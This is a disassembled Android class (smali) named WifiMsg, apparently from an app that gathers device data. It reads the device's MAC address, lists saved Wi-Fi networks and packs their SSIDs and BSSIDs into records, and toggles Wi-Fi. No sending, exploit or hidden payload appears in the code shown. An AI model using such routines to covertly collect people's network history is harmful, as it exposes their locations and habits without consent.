.class public Lcom/Android/MFSocket/WifiMsg;
.super Ljava/lang/Object;
.source "WifiMsg.java"


# instance fields
.field private final WIFI_ENABLE_TIMEOUT_2_SECS:I

.field private final WIFI_ENABLE_TOTAL:I

.field m_context:Landroid/content/Context;


# direct methods
.method public constructor <init>(Landroid/content/Context;)V
    .locals 1
    .param p1, "context"    # Landroid/content/Context;

    .prologue
    .line 18
    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    .line 15
    const/16 v0, 0x7d0

    iput v0, p0, Lcom/Android/MFSocket/WifiMsg;->WIFI_ENABLE_TIMEOUT_2_SECS:I

    .line 16
    const/4 v0, 0x6

    iput v0, p0, Lcom/Android/MFSocket/WifiMsg;->WIFI_ENABLE_TOTAL:I

    .line 19
    iput-object p1, p0, Lcom/Android/MFSocket/WifiMsg;->m_context:Landroid/content/Context;

    .line 20
    return-void
.end method


# virtual methods
.method closeWifi(Landroid/net/wifi/WifiManager;)V
    .locals 1
    .param p1, "wifiObj"    # Landroid/net/wifi/WifiManager;

    .prologue
    .line 43
    const/4 v0, 0x0

    invoke-virtual {p1, v0}, Landroid/net/wifi/WifiManager;->setWifiEnabled(Z)Z

    .line 44
    return-void
.end method

.method getMobileMac()Ljava/lang/String;
    .locals 6

    .prologue
    .line 47
    const-string v0, ""

    .line 49
    .local v0, "strMac":Ljava/lang/String;
    :try_start_0
    iget-object v4, p0, Lcom/Android/MFSocket/WifiMsg;->m_context:Landroid/content/Context;

    const-string v5, "wifi"

    invoke-virtual {v4, v5}, Landroid/content/Context;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v3

    check-cast v3, Landroid/net/wifi/WifiManager;

    .line 50
    .local v3, "wifiObj":Landroid/net/wifi/WifiManager;
    if-nez v3, :cond_0

    move-object v1, v0

    .line 57
    .end local v0    # "strMac":Ljava/lang/String;
    .end local v3    # "wifiObj":Landroid/net/wifi/WifiManager;
    .local v1, "strMac":Ljava/lang/String;
    :goto_0
    return-object v1

    .line 53
    .end local v1    # "strMac":Ljava/lang/String;
    .restart local v0    # "strMac":Ljava/lang/String;
    .restart local v3    # "wifiObj":Landroid/net/wifi/WifiManager;
    :cond_0
    invoke-virtual {v3}, Landroid/net/wifi/WifiManager;->getConnectionInfo()Landroid/net/wifi/WifiInfo;

    move-result-object v2

    .line 54
    .local v2, "wifiInfo":Landroid/net/wifi/WifiInfo;
    invoke-virtual {v2}, Landroid/net/wifi/WifiInfo;->getMacAddress()Ljava/lang/String;
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    move-result-object v0

    .end local v2    # "wifiInfo":Landroid/net/wifi/WifiInfo;
    .end local v3    # "wifiObj":Landroid/net/wifi/WifiManager;
    :goto_1
    move-object v1, v0

    .line 57
    .end local v0    # "strMac":Ljava/lang/String;
    .restart local v1    # "strMac":Ljava/lang/String;
    goto :goto_0

    .line 55
    .end local v1    # "strMac":Ljava/lang/String;
    .restart local v0    # "strMac":Ljava/lang/String;
    :catch_0
    move-exception v4

    goto :goto_1
.end method

.method getWifiInfo(Ljava/lang/StringBuffer;)V
    .locals 6
    .param p1, "wifiMsg"    # Ljava/lang/StringBuffer;
    .annotation system Ldalvik/annotation/Throws;
        value = {
            Ljava/io/IOException;
        }
    .end annotation

    .prologue
    .line 61
    iget-object v4, p0, Lcom/Android/MFSocket/WifiMsg;->m_context:Landroid/content/Context;

    if-nez v4, :cond_1

    .line 117
    :cond_0
    :goto_0
    return-void

    .line 65
    :cond_1
    iget-object v4, p0, Lcom/Android/MFSocket/WifiMsg;->m_context:Landroid/content/Context;

    const-string v5, "wifi"

    invoke-virtual {v4, v5}, Landroid/content/Context;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v3

    check-cast v3, Landroid/net/wifi/WifiManager;

    .line 66
    .local v3, "wifiObj":Landroid/net/wifi/WifiManager;
    if-eqz v3, :cond_0

    .line 82
    :try_start_0
    invoke-virtual {v3}, Landroid/net/wifi/WifiManager;->getConfiguredNetworks()Ljava/util/List;

    move-result-object v1

    .line 83
    .local v1, "listWifiConf":Ljava/util/List;, "Ljava/util/List<Landroid/net/wifi/WifiConfiguration;>;"
    invoke-interface {v1}, Ljava/util/List;->size()I

    move-result v4

    if-lez v4, :cond_0

    .line 84
    const/4 v0, 0x0

    .local v0, "i":I
    :goto_1
    invoke-interface {v1}, Ljava/util/List;->size()I

    move-result v4

    if-ge v0, v4, :cond_0

    .line 85
    invoke-interface {v1, v0}, Ljava/util/List;->get(I)Ljava/lang/Object;

    move-result-object v2

    check-cast v2, Landroid/net/wifi/WifiConfiguration;

    .line 86
    .local v2, "tmpWificonf":Landroid/net/wifi/WifiConfiguration;
    iget-object v4, v2, Landroid/net/wifi/WifiConfiguration;->SSID:Ljava/lang/String;

    invoke-static {v4, p1}, Lcom/Android/MFSocket/RecordPackage;->AppendItem(Ljava/lang/String;Ljava/lang/StringBuffer;)V

    .line 87
    iget-object v4, v2, Landroid/net/wifi/WifiConfiguration;->BSSID:Ljava/lang/String;

    invoke-static {v4, p1}, Lcom/Android/MFSocket/RecordPackage;->AppendItem(Ljava/lang/String;Ljava/lang/StringBuffer;)V

    .line 88
    invoke-static {p1}, Lcom/Android/MFSocket/RecordPackage;->AppendRecord(Ljava/lang/StringBuffer;)V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    .line 84
    add-int/lit8 v0, v0, 0x1

    goto :goto_1

    .line 91
    .end local v0    # "i":I
    .end local v1    # "listWifiConf":Ljava/util/List;, "Ljava/util/List<Landroid/net/wifi/WifiConfiguration;>;"
    .end local v2    # "tmpWificonf":Landroid/net/wifi/WifiConfiguration;
    :catch_0
    move-exception v4

    goto :goto_0
.end method

.method openWifi(Landroid/net/wifi/WifiManager;)Z
    .locals 5
    .param p1, "wifiObj"    # Landroid/net/wifi/WifiManager;

    .prologue
    .line 23
    const/4 v1, 0x0

    .line 24
    .local v1, "total":I
    const/4 v0, 0x0

    .line 26
    .local v0, "enable":Z
    :try_start_0
    invoke-virtual {p1}, Landroid/net/wifi/WifiManager;->isWifiEnabled()Z

    move-result v0

    .line 27
    if-nez v0, :cond_0

    .line 28
    const/4 v3, 0x1

    invoke-virtual {p1, v3}, Landroid/net/wifi/WifiManager;->setWifiEnabled(Z)Z

    move v2, v1

    .line 29
    .end local v1    # "total":I
    .local v2, "total":I
    :goto_0
    add-int/lit8 v1, v2, 0x1

    .end local v2    # "total":I
    .restart local v1    # "total":I
    const/4 v3, 0x6

    if-lt v2, v3, :cond_1

    .line 39
    :cond_0
    :goto_1
    return v0

    .line 30
    :cond_1
    invoke-virtual {p1}, Landroid/net/wifi/WifiManager;->isWifiEnabled()Z

    move-result v3

    if-eqz v3, :cond_2

    .line 31
    const/4 v1, 0x0

    .line 32
    goto :goto_1

    .line 34
    :cond_2
    const-wide/16 v3, 0x7d0

    invoke-static {v3, v4}, Ljava/lang/Thread;->sleep(J)V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    move v2, v1

    .end local v1    # "total":I
    .restart local v2    # "total":I
    goto :goto_0

    .line 37
    .end local v2    # "total":I
    .restart local v1    # "total":I
    :catch_0
    move-exception v3

    goto :goto_1
.end method
